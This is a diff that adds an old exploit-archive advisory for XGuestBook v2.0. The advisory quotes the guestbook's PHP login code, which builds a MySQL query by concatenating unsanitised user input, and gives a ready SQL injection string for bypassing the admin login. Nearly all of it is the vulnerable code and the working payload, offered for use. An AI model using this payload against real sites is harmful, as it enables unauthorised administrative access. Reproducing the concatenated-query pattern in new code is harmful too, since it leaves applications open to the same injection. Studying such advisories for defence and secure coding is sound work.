@@ -1,0 +1,37 @@
+##########################################################################
+
+Author = FireShot , Jacopo Vuga.
+Mail = fireshot<at>autistici<dot>org
+
+Vulnerability = SQL Admin Auth Bypass
+Software = XGuestBook v2.0
+Download =http://script.wareseeker.com/download/xguestbook.rar/14488
+
+Greets to = Osirys, Myral, str0ke
+
+###########################################################################
+
+[CODE]
+
+$user = $_POST['user'];
+$pass = md5($_POST['pass']);
+
+$result = mysql_query("SELECT * FROM xgb_user WHERE user='" . $user . "'
+AND pass= '" . $pass . "'", $db_conn) or die (mysql_error());
+
+[/CODE]
+
+
+[EXPLOIT]
+
+[URL] = http://www.site.com/login.php
+
+you can inject SQL code in the USER space to bypass the admin login 
+
+[USER] = admin' or '1=1
+
+[/EXPLOIT]
+
+############################################################################
+
+# milw0rm.com [2009-02-24]
